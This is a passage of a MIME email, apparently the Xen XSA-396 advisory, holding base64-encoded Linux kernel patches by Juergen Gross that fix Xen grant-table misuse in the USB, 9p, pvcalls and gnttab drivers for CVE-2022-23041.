-cmVpZ25fYWNjZXNzCQk9IGdudHRhYl9xdWVyeV9mb3JlaWduX2FjY2Vzc192
-MiwKIH07CiAKIHN0YXRpYyBib29sIGdudHRhYl9uZWVkX3YyKHZvaWQpCmRp
-ZmYgLS1naXQgYS9pbmNsdWRlL3hlbi9ncmFudF90YWJsZS5oIGIvaW5jbHVk
-ZS94ZW4vZ3JhbnRfdGFibGUuaAppbmRleCAzNThkMjgxNzc0MWIuLmFiOWU2
-OTJhMGVmNCAxMDA2NDQKLS0tIGEvaW5jbHVkZS94ZW4vZ3JhbnRfdGFibGUu
-aAorKysgYi9pbmNsdWRlL3hlbi9ncmFudF90YWJsZS5oCkBAIC0xMjUsOCAr
-MTI1LDYgQEAgaW50IGdudHRhYl9ncmFudF9mb3JlaWduX3RyYW5zZmVyKGRv
-bWlkX3QgZG9taWQsIHVuc2lnbmVkIGxvbmcgcGZuKTsKIHVuc2lnbmVkIGxv
-bmcgZ250dGFiX2VuZF9mb3JlaWduX3RyYW5zZmVyX3JlZihncmFudF9yZWZf
-dCByZWYpOwogdW5zaWduZWQgbG9uZyBnbnR0YWJfZW5kX2ZvcmVpZ25fdHJh
-bnNmZXIoZ3JhbnRfcmVmX3QgcmVmKTsKIAotaW50IGdudHRhYl9xdWVyeV9m
-b3JlaWduX2FjY2VzcyhncmFudF9yZWZfdCByZWYpOwotCiAvKgogICogb3Bl
-cmF0aW9ucyBvbiByZXNlcnZlZCBiYXRjaGVzIG9mIGdyYW50IHJlZmVyZW5j
-ZXMKICAqLwotLSAKMi4zNC4xCgo=
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-08.patch"
-Content-Disposition: attachment; filename="xsa396-linux-08.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSA1MmIwZTVlZTI4ZTAyYTdhMzQ5MTRjYTA5NzYxZjVmNDg1YjBmM2M2
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDIgKzAxMDAKU3ViamVjdDogW1BBVENIIDA4LzEyXSB4ZW4vdXNiOiBk
-b24ndCB1c2UgZ250dGFiX2VuZF9mb3JlaWduX2FjY2VzcygpIGluCiB4ZW5o
-Y2RfZ250dGFiX2RvbmUoKQoKVGhlIHVzYWdlIG9mIGdudHRhYl9lbmRfZm9y
-ZWlnbl9hY2Nlc3MoKSBpbiB4ZW5oY2RfZ250dGFiX2RvbmUoKSBpcwpub3Qg
-c2FmZSBhZ2FpbnN0IGEgbWFsaWNpb3VzIGJhY2tlbmQsIGFzIHRoZSBiYWNr
-ZW5kIGNvdWxkIGtlZXAgdGhlCkkvTyBwYWdlIG1hcHBlZCBhbmQgbW9kaWZ5
-IGl0IGV2ZW4gYWZ0ZXIgdGhlIGdyYW50ZWQgbWVtb3J5IHBhZ2UgaXMKYmVp
-bmcgdXNlZCBmb3IgY29tcGxldGVseSBvdGhlciBwdXJwb3NlcyBpbiB0aGUg
-bG9jYWwgc3lzdGVtLgoKU28gcmVwbGFjZSB0aGF0IHVzZSBjYXNlIHdpdGgg
-Z250dGFiX3RyeV9lbmRfZm9yZWlnbl9hY2Nlc3MoKSBhbmQKZGlzYWJsZSB0
-aGUgUFYgaG9zdCBhZGFwdGVyIGluIGNhc2UgdGhlIGJhY2tlbmQgZGlkbid0
-IHN0b3AgdXNpbmcgdGhlCmdyYW50ZWQgcGFnZS4KCkluIHhlbmhjZF91cmJf
-cmVxdWVzdF9kb25lKCkgaW1tZWRpYXRlbHkgcmV0dXJuIGluIGNhc2Ugb2Yg
-c2V0dGluZwp0aGUgZGV2aWNlIHN0YXRlIHRvICJlcnJvciIgaW5zdGVhZCBv
-ZiBsb29raW5nIGludG8gZnVydGhlciBiYWNrZW5kCnJlc3BvbnNlcy4KClJl
-cG9ydGVkLWJ5OiBEZW1pIE1hcmllIE9iZW5vdXIgPGRlbWlAaW52aXNpYmxl
-dGhpbmdzbGFiLmNvbT4KU2lnbmVkLW9mZi1ieTogSnVlcmdlbiBHcm9zcyA8
-amdyb3NzQHN1c2UuY29tPgpSZXZpZXdlZC1ieTogSmFuIEJldWxpY2ggPGpi
-ZXVsaWNoQHN1c2UuY29tPgotLS0KIGRyaXZlcnMvdXNiL2hvc3QveGVuLWhj
-ZC5jIHwgMjYgKysrKysrKysrKysrKysrKysrLS0tLS0tLS0KIDEgZmlsZSBj
-aGFuZ2VkLCAxOCBpbnNlcnRpb25zKCspLCA4IGRlbGV0aW9ucygtKQoKZGlm
-ZiAtLWdpdCBhL2RyaXZlcnMvdXNiL2hvc3QveGVuLWhjZC5jIGIvZHJpdmVy
-cy91c2IvaG9zdC94ZW4taGNkLmMKaW5kZXggYmUwOWZkOWJhYzU4Li4xOWI4
-YzdlZDc0Y2IgMTAwNjQ0Ci0tLSBhL2RyaXZlcnMvdXNiL2hvc3QveGVuLWhj
-ZC5jCisrKyBiL2RyaXZlcnMvdXNiL2hvc3QveGVuLWhjZC5jCkBAIC03MTYs
-OCArNzE2LDkgQEAgc3RhdGljIGludCB4ZW5oY2RfbWFwX3VyYl9mb3JfcmVx
-dWVzdChzdHJ1Y3QgeGVuaGNkX2luZm8gKmluZm8sIHN0cnVjdCB1cmIgKnVy
-YiwKIAlyZXR1cm4gMDsKIH0KIAotc3RhdGljIHZvaWQgeGVuaGNkX2dudHRh
-Yl9kb25lKHN0cnVjdCB1c2Jfc2hhZG93ICpzaGFkb3cpCitzdGF0aWMgdm9p
-ZCB4ZW5oY2RfZ250dGFiX2RvbmUoc3RydWN0IHhlbmhjZF9pbmZvICppbmZv
-LCB1bnNpZ25lZCBpbnQgaWQpCiB7CisJc3RydWN0IHVzYl9zaGFkb3cgKnNo
-YWRvdyA9IGluZm8tPnNoYWRvdyArIGlkOwogCWludCBucl9zZWdzID0gMDsK
-IAlpbnQgaTsKIApAQCAtNzI2LDggKzcyNywxMCBAQCBzdGF0aWMgdm9pZCB4
-ZW5oY2RfZ250dGFiX2RvbmUoc3RydWN0IHVzYl9zaGFkb3cgKnNoYWRvdykK
-IAlpZiAoeGVudXNiX3BpcGVpc29jKHNoYWRvdy0+cmVxLnBpcGUpKQogCQlu
-cl9zZWdzICs9IHNoYWRvdy0+cmVxLnUuaXNvYy5ucl9mcmFtZV9kZXNjX3Nl
-Z3M7CiAKLQlmb3IgKGkgPSAwOyBpIDwgbnJfc2VnczsgaSsrKQotCQlnbnR0
-YWJfZW5kX2ZvcmVpZ25fYWNjZXNzKHNoYWRvdy0+cmVxLnNlZ1tpXS5ncmVm
-LCAwLCAwVUwpOworCWZvciAoaSA9IDA7IGkgPCBucl9zZWdzOyBpKyspIHsK
-KwkJaWYgKCFnbnR0YWJfdHJ5X2VuZF9mb3JlaWduX2FjY2VzcyhzaGFkb3ct
-PnJlcS5zZWdbaV0uZ3JlZikpCisJCQl4ZW5oY2Rfc2V0X2Vycm9yKGluZm8s
-ICJiYWNrZW5kIGRpZG4ndCByZWxlYXNlIGdyYW50Iik7CisJfQogCiAJc2hh
-ZG93LT5yZXEubnJfYnVmZmVyX3NlZ3MgPSAwOwogCXNoYWRvdy0+cmVxLnUu
-aXNvYy5ucl9mcmFtZV9kZXNjX3NlZ3MgPSAwOwpAQCAtODQxLDcgKzg0NCw5
-IEBAIHN0YXRpYyB2b2lkIHhlbmhjZF9jYW5jZWxfYWxsX2VucXVldWVkX3Vy
-YnMoc3RydWN0IHhlbmhjZF9pbmZvICppbmZvKQogCWxpc3RfZm9yX2VhY2hf
-ZW50cnlfc2FmZSh1cmJwLCB0bXAsICZpbmZvLT5pbl9wcm9ncmVzc19saXN0
-LCBsaXN0KSB7CiAJCXJlcV9pZCA9IHVyYnAtPnJlcV9pZDsKIAkJaWYgKCF1
-cmJwLT51bmxpbmtlZCkgewotCQkJeGVuaGNkX2dudHRhYl9kb25lKCZpbmZv
-LT5zaGFkb3dbcmVxX2lkXSk7CisJCQl4ZW5oY2RfZ250dGFiX2RvbmUoaW5m
-bywgcmVxX2lkKTsKKwkJCWlmIChpbmZvLT5lcnJvcikKKwkJCQlyZXR1cm47
-CiAJCQlpZiAodXJicC0+dXJiLT5zdGF0dXMgPT0gLUVJTlBST0dSRVNTKQog
-CQkJCS8qIG5vdCBkZXF1ZXVlZCAqLwogCQkJCXhlbmhjZF9naXZlYmFja191
-cmIoaW5mbywgdXJicC0+dXJiLApAQCAtOTQyLDggKzk0Nyw3IEBAIHN0YXRp
-YyBpbnQgeGVuaGNkX3VyYl9yZXF1ZXN0X2RvbmUoc3RydWN0IHhlbmhjZF9p
-bmZvICppbmZvKQogCXJwID0gaW5mby0+dXJiX3Jpbmcuc3JpbmctPnJzcF9w
-cm9kOwogCWlmIChSSU5HX1JFU1BPTlNFX1BST0RfT1ZFUkZMT1coJmluZm8t
-PnVyYl9yaW5nLCBycCkpIHsKIAkJeGVuaGNkX3NldF9lcnJvcihpbmZvLCAi
-SWxsZWdhbCBpbmRleCBvbiB1cmItcmluZyIpOwotCQlzcGluX3VubG9ja19p
-cnFyZXN0b3JlKCZpbmZvLT5sb2NrLCBmbGFncyk7Ci0JCXJldHVybiAwOwor
-CQlnb3RvIGVycjsKIAl9CiAJcm1iKCk7IC8qIGVuc3VyZSB3ZSBzZWUgcXVl
-dWVkIHJlc3BvbnNlcyB1cCB0byAicnAiICovCiAKQEAgLTk1MiwxMSArOTU2
-LDEzIEBAIHN0YXRpYyBpbnQgeGVuaGNkX3VyYl9yZXF1ZXN0X2RvbmUoc3Ry
-dWN0IHhlbmhjZF9pbmZvICppbmZvKQogCQlpZCA9IHJlcy5pZDsKIAkJaWYg
-KGlkID49IFhFTlVTQl9VUkJfUklOR19TSVpFKSB7CiAJCQl4ZW5oY2Rfc2V0
-X2Vycm9yKGluZm8sICJJbGxlZ2FsIGRhdGEgb24gdXJiLXJpbmciKTsKLQkJ
-CWNvbnRpbnVlOworCQkJZ290byBlcnI7CiAJCX0KIAogCQlpZiAobGlrZWx5
-KHhlbnVzYl9waXBlc3VibWl0KGluZm8tPnNoYWRvd1tpZF0ucmVxLnBpcGUp
-KSkgewotCQkJeGVuaGNkX2dudHRhYl9kb25lKCZpbmZvLT5zaGFkb3dbaWRd
-KTsKKwkJCXhlbmhjZF9nbnR0YWJfZG9uZShpbmZvLCBpZCk7CisJCQlpZiAo
-aW5mby0+ZXJyb3IpCisJCQkJZ290byBlcnI7CiAJCQl1cmIgPSBpbmZvLT5z
-aGFkb3dbaWRdLnVyYjsKIAkJCWlmIChsaWtlbHkodXJiKSkgewogCQkJCXVy
-Yi0+YWN0dWFsX2xlbmd0aCA9IHJlcy5hY3R1YWxfbGVuZ3RoOwpAQCAtOTc4
-LDYgKzk4NCwxMCBAQCBzdGF0aWMgaW50IHhlbmhjZF91cmJfcmVxdWVzdF9k
-b25lKHN0cnVjdCB4ZW5oY2RfaW5mbyAqaW5mbykKIAlzcGluX3VubG9ja19p
-cnFyZXN0b3JlKCZpbmZvLT5sb2NrLCBmbGFncyk7CiAKIAlyZXR1cm4gbW9y
-ZV90b19kbzsKKworIGVycjoKKwlzcGluX3VubG9ja19pcnFyZXN0b3JlKCZp
-bmZvLT5sb2NrLCBmbGFncyk7CisJcmV0dXJuIDA7CiB9CiAKIHN0YXRpYyBp
-bnQgeGVuaGNkX2Nvbm5fbm90aWZ5KHN0cnVjdCB4ZW5oY2RfaW5mbyAqaW5m
-bykKLS0gCjIuMzQuMQoK
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-09.patch"
-Content-Disposition: attachment; filename="xsa396-linux-09.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSA1YmYyODA2OGEzNTAwYWE0NzFhZTAzYmY2YmU3Zjc0NTI0NGI3ZGJm
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDIgKzAxMDAKU3ViamVjdDogW1BBVENIIDA5LzEyXSB4ZW4vOXA6IHVz
-ZSBhbGxvYy9mcmVlX3BhZ2VzX2V4YWN0KCkKCkluc3RlYWQgb2YgX19nZXRf
-ZnJlZV9wYWdlcygpIGFuZCBmcmVlX3BhZ2VzKCkgdXNlIGFsbG9jX3BhZ2Vz
-X2V4YWN0KCkKYW5kIGZyZWVfcGFnZXNfZXhhY3QoKS4gVGhpcyBpcyBpbiBw
-cmVwYXJhdGlvbiBvZiBhIGNoYW5nZSBvZgpnbnR0YWJfZW5kX2ZvcmVpZ25f
-YWNjZXNzKCkgd2hpY2ggd2lsbCBwcm9oaWJpdCB1c2Ugb2YgaGlnaC1vcmRl
-cgpwYWdlcy4KCkJ5IHVzaW5nIHRoZSBsb2NhbCB2YXJpYWJsZSAib3JkZXIi
-IGluc3RlYWQgb2YgcmluZy0+aW50Zi0+cmluZ19vcmRlcgppbiB0aGUgZXJy
-b3IgcGF0aCBvZiB4ZW5fOXBmc19mcm9udF9hbGxvY19kYXRhcmluZygpIGFu
-b3RoZXIgYnVnIGlzCmZpeGVkLCBhcyB0aGUgZXJyb3IgcGF0aCBjYW4gYmUg
-ZW50ZXJlZCBiZWZvcmUgcmluZy0+aW50Zi0+cmluZ19vcmRlcgppcyBiZWlu
-ZyBzZXQuCgpCeSB1c2luZyBhbGxvY19wYWdlc19leGFjdCgpIHRoZSBzaXpl
-IGluIGJ5dGVzIGlzIHNwZWNpZmllZCBmb3IgdGhlCmFsbG9jYXRpb24sIHdo
-aWNoIGZpeGVzIGFub3RoZXIgYnVnIGZvciB0aGUgY2FzZSBvZgpvcmRlciA8
-IChQQUdFX1NISUZUIC0gWEVOX1BBR0VfU0hJRlQpLgoKVGhpcyBpcyBwYXJ0
-IG9mIENWRS0yMDIyLTIzMDQxIC8gWFNBLTM5Ni4KClJlcG9ydGVkLWJ5OiBT
-aW1vbiBHYWlzZXIgPHNpbW9uQGludmlzaWJsZXRoaW5nc2xhYi5jb20+ClNp
-Z25lZC1vZmYtYnk6IEp1ZXJnZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4K
-UmV2aWV3ZWQtYnk6IEphbiBCZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4K
-LS0tCiBuZXQvOXAvdHJhbnNfeGVuLmMgfCAxNCArKysrKystLS0tLS0tLQog
-MSBmaWxlIGNoYW5nZWQsIDYgaW5zZXJ0aW9ucygrKSwgOCBkZWxldGlvbnMo
-LSkKCmRpZmYgLS1naXQgYS9uZXQvOXAvdHJhbnNfeGVuLmMgYi9uZXQvOXAv
-dHJhbnNfeGVuLmMKaW5kZXggZWI5ZmI1NTI4MGVmLi4wMWY4MDY3OTk0ZDYg
-MTAwNjQ0Ci0tLSBhL25ldC85cC90cmFuc194ZW4uYworKysgYi9uZXQvOXAv
-dHJhbnNfeGVuLmMKQEAgLTI4MSw5ICsyODEsOSBAQCBzdGF0aWMgdm9pZCB4
-ZW5fOXBmc19mcm9udF9mcmVlKHN0cnVjdCB4ZW5fOXBmc19mcm9udF9wcml2
-ICpwcml2KQogCQkJCXJlZiA9IHByaXYtPnJpbmdzW2ldLmludGYtPnJlZltq
-XTsKIAkJCQlnbnR0YWJfZW5kX2ZvcmVpZ25fYWNjZXNzKHJlZiwgMCwgMCk7
-CiAJCQl9Ci0JCQlmcmVlX3BhZ2VzKCh1bnNpZ25lZCBsb25nKXByaXYtPnJp
-bmdzW2ldLmRhdGEuaW4sCi0JCQkJICAgcHJpdi0+cmluZ3NbaV0uaW50Zi0+
-cmluZ19vcmRlciAtCi0JCQkJICAgKFBBR0VfU0hJRlQgLSBYRU5fUEFHRV9T
-SElGVCkpOworCQkJZnJlZV9wYWdlc19leGFjdChwcml2LT5yaW5nc1tpXS5k
-YXRhLmluLAorCQkJCSAgIDFVTCA8PCAocHJpdi0+cmluZ3NbaV0uaW50Zi0+
-cmluZ19vcmRlciArCisJCQkJCSAgIFhFTl9QQUdFX1NISUZUKSk7CiAJCX0K
-IAkJZ250dGFiX2VuZF9mb3JlaWduX2FjY2Vzcyhwcml2LT5yaW5nc1tpXS5y
-ZWYsIDAsIDApOwogCQlmcmVlX3BhZ2UoKHVuc2lnbmVkIGxvbmcpcHJpdi0+
-cmluZ3NbaV0uaW50Zik7CkBAIC0zMjIsOCArMzIyLDggQEAgc3RhdGljIGlu
-dCB4ZW5fOXBmc19mcm9udF9hbGxvY19kYXRhcmluZyhzdHJ1Y3QgeGVuYnVz
-X2RldmljZSAqZGV2LAogCWlmIChyZXQgPCAwKQogCQlnb3RvIG91dDsKIAly
-aW5nLT5yZWYgPSByZXQ7Ci0JYnl0ZXMgPSAodm9pZCAqKV9fZ2V0X2ZyZWVf
-cGFnZXMoR0ZQX0tFUk5FTCB8IF9fR0ZQX1pFUk8sCi0JCQlvcmRlciAtIChQ
-QUdFX1NISUZUIC0gWEVOX1BBR0VfU0hJRlQpKTsKKwlieXRlcyA9IGFsbG9j
-X3BhZ2VzX2V4YWN0KDFVTCA8PCAob3JkZXIgKyBYRU5fUEFHRV9TSElGVCks
-CisJCQkJICBHRlBfS0VSTkVMIHwgX19HRlBfWkVSTyk7CiAJaWYgKCFieXRl
-cykgewogCQlyZXQgPSAtRU5PTUVNOwogCQlnb3RvIG91dDsKQEAgLTM1NCw5
-ICszNTQsNyBAQCBzdGF0aWMgaW50IHhlbl85cGZzX2Zyb250X2FsbG9jX2Rh
-dGFyaW5nKHN0cnVjdCB4ZW5idXNfZGV2aWNlICpkZXYsCiAJaWYgKGJ5dGVz
-KSB7CiAJCWZvciAoaS0tOyBpID49IDA7IGktLSkKIAkJCWdudHRhYl9lbmRf
-Zm9yZWlnbl9hY2Nlc3MocmluZy0+aW50Zi0+cmVmW2ldLCAwLCAwKTsKLQkJ
-ZnJlZV9wYWdlcygodW5zaWduZWQgbG9uZylieXRlcywKLQkJCSAgIHJpbmct
-PmludGYtPnJpbmdfb3JkZXIgLQotCQkJICAgKFBBR0VfU0hJRlQgLSBYRU5f
-UEFHRV9TSElGVCkpOworCQlmcmVlX3BhZ2VzX2V4YWN0KGJ5dGVzLCAxVUwg
-PDwgKG9yZGVyICsgWEVOX1BBR0VfU0hJRlQpKTsKIAl9CiAJZ250dGFiX2Vu
-ZF9mb3JlaWduX2FjY2VzcyhyaW5nLT5yZWYsIDAsIDApOwogCWZyZWVfcGFn
-ZSgodW5zaWduZWQgbG9uZylyaW5nLT5pbnRmKTsKLS0gCjIuMzQuMQoK
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-10.patch"
-Content-Disposition: attachment; filename="xsa396-linux-10.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSA2NzQ4MDcwM2MyMTVjMjliOTY2YzljNWIwY2Y1MTBjMjZiMzMwNzRk
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDMgKzAxMDAKU3ViamVjdDogW1BBVENIIDEwLzEyXSB4ZW4vcHZjYWxs
-czogdXNlIGFsbG9jL2ZyZWVfcGFnZXNfZXhhY3QoKQoKSW5zdGVhZCBvZiBf
-X2dldF9mcmVlX3BhZ2VzKCkgYW5kIGZyZWVfcGFnZXMoKSB1c2UgYWxsb2Nf
-cGFnZXNfZXhhY3QoKQphbmQgZnJlZV9wYWdlc19leGFjdCgpLiBUaGlzIGlz
-IGluIHByZXBhcmF0aW9uIG9mIGEgY2hhbmdlIG9mCmdudHRhYl9lbmRfZm9y
-ZWlnbl9hY2Nlc3MoKSB3aGljaCB3aWxsIHByb2hpYml0IHVzZSBvZiBoaWdo
-LW9yZGVyCnBhZ2VzLgoKVGhpcyBpcyBwYXJ0IG9mIENWRS0yMDIyLTIzMDQx
-IC8gWFNBLTM5Ni4KClJlcG9ydGVkLWJ5OiBTaW1vbiBHYWlzZXIgPHNpbW9u
-QGludmlzaWJsZXRoaW5nc2xhYi5jb20+ClNpZ25lZC1vZmYtYnk6IEp1ZXJn
-ZW4gR3Jvc3MgPGpncm9zc0BzdXNlLmNvbT4KUmV2aWV3ZWQtYnk6IEphbiBC
-ZXVsaWNoIDxqYmV1bGljaEBzdXNlLmNvbT4KLS0tCiBkcml2ZXJzL3hlbi9w
-dmNhbGxzLWZyb250LmMgfCA4ICsrKystLS0tCiAxIGZpbGUgY2hhbmdlZCwg
-NCBpbnNlcnRpb25zKCspLCA0IGRlbGV0aW9ucygtKQoKZGlmZiAtLWdpdCBh
-L2RyaXZlcnMveGVuL3B2Y2FsbHMtZnJvbnQuYyBiL2RyaXZlcnMveGVuL3B2
-Y2FsbHMtZnJvbnQuYwppbmRleCAzYzlhZTE1NmI1OTcuLjBjYTM1MWYzMGE2
-ZCAxMDA2NDQKLS0tIGEvZHJpdmVycy94ZW4vcHZjYWxscy1mcm9udC5jCisr
-KyBiL2RyaXZlcnMveGVuL3B2Y2FsbHMtZnJvbnQuYwpAQCAtMzM3LDggKzMz
-Nyw4IEBAIHN0YXRpYyB2b2lkIGZyZWVfYWN0aXZlX3Jpbmcoc3RydWN0IHNv
-Y2tfbWFwcGluZyAqbWFwKQogCWlmICghbWFwLT5hY3RpdmUucmluZykKIAkJ
-cmV0dXJuOwogCi0JZnJlZV9wYWdlcygodW5zaWduZWQgbG9uZyltYXAtPmFj
-dGl2ZS5kYXRhLmluLAotCQkJbWFwLT5hY3RpdmUucmluZy0+cmluZ19vcmRl
-cik7CisJZnJlZV9wYWdlc19leGFjdChtYXAtPmFjdGl2ZS5kYXRhLmluLAor
-CQkJIFBBR0VfU0laRSA8PCBtYXAtPmFjdGl2ZS5yaW5nLT5yaW5nX29yZGVy
-KTsKIAlmcmVlX3BhZ2UoKHVuc2lnbmVkIGxvbmcpbWFwLT5hY3RpdmUucmlu
-Zyk7CiB9CiAKQEAgLTM1Miw4ICszNTIsOCBAQCBzdGF0aWMgaW50IGFsbG9j
-X2FjdGl2ZV9yaW5nKHN0cnVjdCBzb2NrX21hcHBpbmcgKm1hcCkKIAkJZ290
-byBvdXQ7CiAKIAltYXAtPmFjdGl2ZS5yaW5nLT5yaW5nX29yZGVyID0gUFZD
-QUxMU19SSU5HX09SREVSOwotCWJ5dGVzID0gKHZvaWQgKilfX2dldF9mcmVl
-X3BhZ2VzKEdGUF9LRVJORUwgfCBfX0dGUF9aRVJPLAotCQkJCQlQVkNBTExT
-X1JJTkdfT1JERVIpOworCWJ5dGVzID0gYWxsb2NfcGFnZXNfZXhhY3QoUEFH
-RV9TSVpFIDw8IFBWQ0FMTFNfUklOR19PUkRFUiwKKwkJCQkgIEdGUF9LRVJO
-RUwgfCBfX0dGUF9aRVJPKTsKIAlpZiAoIWJ5dGVzKQogCQlnb3RvIG91dDsK
-IAotLSAKMi4zNC4xCgo=
-
---=separator
-Content-Type: application/octet-stream; name="xsa396-linux-11.patch"
-Content-Disposition: attachment; filename="xsa396-linux-11.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbSA5Y2NmNDIwNDI5NDcwNjgxOTM1M2JiNzA5ODFiMWFlZWJkMTc5YmUy
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBKdWVyZ2VuIEdyb3Nz
-IDxqZ3Jvc3NAc3VzZS5jb20+CkRhdGU6IEZyaSwgMjUgRmViIDIwMjIgMTY6
-MDU6NDMgKzAxMDAKU3ViamVjdDogW1BBVENIIDExLzEyXSB4ZW4vZ250dGFi
-OiBmaXggZ250dGFiX2VuZF9mb3JlaWduX2FjY2VzcygpIHdpdGhvdXQKIHBh
-Z2Ugc3BlY2lmaWVkCgpnbnR0YWJfZW5kX2ZvcmVpZ25fYWNjZXNzKCkgaXMg
-dXNlZCB0byBmcmVlIGEgZ3JhbnQgcmVmZXJlbmNlIGFuZApvcHRpb25hbGx5
-IHRvIGZyZWUgdGhlIGFzc29jaWF0ZWQgcGFnZS4gSW4gY2FzZSB0aGUgZ3Jh
-bnQgaXMgc3RpbGwgaW4KdXNlIGJ5IHRoZSBvdGhlciBzaWRlIHByb2Nlc3Np
-bmcgaXMgYmVpbmcgZGVmZXJyZWQuIFRoaXMgbGVhZHMgdG8gYQpwcm9ibGVt
-IGluIGNhc2Ugbm8gcGFnZSB0byBiZSBmcmVlZCBpcyBzcGVjaWZpZWQgYnkg
-dGhlIGNhbGxlcjogdGhlCmNhbGxlciBkb2Vzbid0IGtub3cgdGhhdCB0aGUg
-cGFnZSBpcyBzdGlsbCBtYXBwZWQgYnkgdGhlIG90aGVyIHNpZGUKYW5kIHRo
-dXMgc2hvdWxkIG5vdCBiZSB1c2VkIGZvciBvdGhlciBwdXJwb3Nlcy4KClRo
-ZSBjb3JyZWN0IHdheSB0byBoYW5kbGUgdGhpcyBzaXR1YXRpb24gaXMgdG8g
-dGFrZSBhbiBhZGRpdGlvbmFsCnJlZmVyZW5jZSB0byB0aGUgZ3JhbnRlZCBw
-YWdlIGluIGNhc2UgaGFuZGxpbmcgaXMgYmVpbmcgZGVmZXJyZWQgYW5kCnRv
-IGRyb3AgdGhhdCByZWZlcmVuY2Ugd2hlbiB0aGUgZ3JhbnQgcmVmZXJlbmNl
-IGNvdWxkIGJlIGZyZWVkCmZpbmFsbHkuCgpUaGlzIHJlcXVpcmVzIHRoYXQg
-dGhlcmUgYXJlIG5vIHVzZXJzIG9mIGdudHRhYl9lbmRfZm9yZWlnbl9hY2Nl
-c3MoKQpsZWZ0IGRpcmVjdGx5IHJlcHVycG9zaW5nIHRoZSBncmFudGVkIHBh
-Z2UgYWZ0ZXIgdGhlIGNhbGwsIGFzIHRoaXMKbWlnaHQgcmVzdWx0IGluIGNs
-b2JiZXJlZCBkYXRhIG9yIGluZm9ybWF0aW9uIGxlYWtzIHZpYSB0aGUgbm90
-IHlldApmcmVlZCBncmFudCByZWZlcmVuY2UuCgpUaGlzIGlzIHBhcnQgb2Yg
-Q1ZFLTIwMjItMjMwNDEgLyBYU0EtMzk2LgoKUmVwb3J0ZWQtYnk6IFNpbW9u
-IEdhaXNlciA8c2ltb25AaW52aXNpYmxldGhpbmdzbGFiLmNvbT4KU2lnbmVk
-LW9mZi1ieTogSnVlcmdlbiBHcm9zcyA8amdyb3NzQHN1c2UuY29tPgpSZXZp
-ZXdlZC1ieTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgotLS0K
-IGRyaXZlcnMveGVuL2dyYW50LXRhYmxlLmMgfCAzNiArKysrKysrKysrKysr
-KysrKysrKysrKysrKysrKy0tLS0tLS0KIGluY2x1ZGUveGVuL2dyYW50X3Rh
-YmxlLmggfCAgNyArKysrKystCiAyIGZpbGVzIGNoYW5nZWQsIDM1IGluc2Vy
-dGlvbnMoKyksIDggZGVsZXRpb25zKC0pCgpkaWZmIC0tZ2l0IGEvZHJpdmVy
-cy94ZW4vZ3JhbnQtdGFibGUuYyBiL2RyaXZlcnMveGVuL2dyYW50LXRhYmxl
-LmMKaW5kZXggZTY1NDg5MTBlNzlmLi41YzgzZDQxNzY2YzggMTAwNjQ0Ci0t
-LSBhL2RyaXZlcnMveGVuL2dyYW50LXRhYmxlLmMKKysrIGIvZHJpdmVycy94
-ZW4vZ3JhbnQtdGFibGUuYwpAQCAtMTMzLDYgKzEzMywxMCBAQCBzdHJ1Y3Qg
-Z250dGFiX29wcyB7CiAJICogcmV0dXJuIHRoZSBmcmFtZS4KIAkgKi8KIAl1
-bnNpZ25lZCBsb25nICgqZW5kX2ZvcmVpZ25fdHJhbnNmZXJfcmVmKShncmFu
-dF9yZWZfdCByZWYpOworCS8qCisJICogUmVhZCB0aGUgZnJhbWUgbnVtYmVy
-IHJlbGF0ZWQgdG8gYSBnaXZlbiBncmFudCByZWZlcmVuY2UuCisJICovCisJ
-dW5zaWduZWQgbG9uZyAoKnJlYWRfZnJhbWUpKGdyYW50X3JlZl90IHJlZik7
-CiB9OwogCiBzdHJ1Y3QgdW5tYXBfcmVmc19jYWxsYmFja19kYXRhIHsKQEAg
-LTMzMCw2ICszMzQsMTYgQEAgaW50IGdudHRhYl9lbmRfZm9yZWlnbl9hY2Nl
-c3NfcmVmKGdyYW50X3JlZl90IHJlZiwgaW50IHJlYWRvbmx5KQogfQogRVhQ
-T1JUX1NZTUJPTF9HUEwoZ250dGFiX2VuZF9mb3JlaWduX2FjY2Vzc19yZWYp
-OwogCitzdGF0aWMgdW5zaWduZWQgbG9uZyBnbnR0YWJfcmVhZF9mcmFtZV92
-MShncmFudF9yZWZfdCByZWYpCit7CisJcmV0dXJuIGdudHRhYl9zaGFyZWQu
-djFbcmVmXS5mcmFtZTsKK30KKworc3RhdGljIHVuc2lnbmVkIGxvbmcgZ250
-dGFiX3JlYWRfZnJhbWVfdjIoZ3JhbnRfcmVmX3QgcmVmKQoreworCXJldHVy
-biBnbnR0YWJfc2hhcmVkLnYyW3JlZl0uZnVsbF9wYWdlLmZyYW1lOworfQor
-CiBzdHJ1Y3QgZGVmZXJyZWRfZW50cnkgewogCXN0cnVjdCBsaXN0X2hlYWQg
-bGlzdDsKIAlncmFudF9yZWZfdCByZWY7CkBAIC0zNTksMTIgKzM3Myw5IEBA
-IHN0YXRpYyB2b2lkIGdudHRhYl9oYW5kbGVfZGVmZXJyZWQoc3RydWN0IHRp
-bWVyX2xpc3QgKnVudXNlZCkKIAkJc3Bpbl91bmxvY2tfaXJxcmVzdG9yZSgm
